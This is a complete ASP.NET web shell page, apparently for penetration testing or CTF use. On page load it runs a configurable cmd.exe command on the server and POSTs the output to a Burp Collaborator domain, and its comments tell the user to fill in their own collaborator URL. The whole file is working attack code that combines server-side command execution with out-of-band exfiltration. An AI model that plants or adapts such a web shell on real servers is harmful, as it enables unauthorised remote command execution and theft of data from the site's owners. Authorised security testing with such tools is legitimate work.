<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        // 1. CHANGE THIS to your unique Burp Collaborator domain.
        // Make sure to include http:// or https://
        string collaboratorUrl = "http://your-unique-id.burpcollaborator.net";

        // 2. This is the command that will be executed.
        string commandToRun = "dir";
        
        try
        {
            // Execute the command and capture the output
            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + commandToRun);
            procStartInfo.RedirectStandardOutput = true;
            procStartInfo.UseShellExecute = false;
            procStartInfo.CreateNoWindow = true;

            Process proc = new Process();
            proc.StartInfo = procStartInfo;
            proc.Start();

            // Get the output into a string
            string commandOutput = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit();

            // Send the captured output to the Burp Collaborator server
            using (WebClient client = new WebClient())
            {
                // We use UploadString (a POST request) as it's better for sending larger amounts of data
                client.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                string response = client.UploadString(collaboratorUrl, "output=" + commandOutput);
            }
            
            // Write a message to the browser so you know the script ran
            Response.Write("Command output sent to Burp Collaborator.");
        }
        catch (Exception ex)
        {
            Response.Write("An error occurred: " + ex.Message);
        }
    }
</script>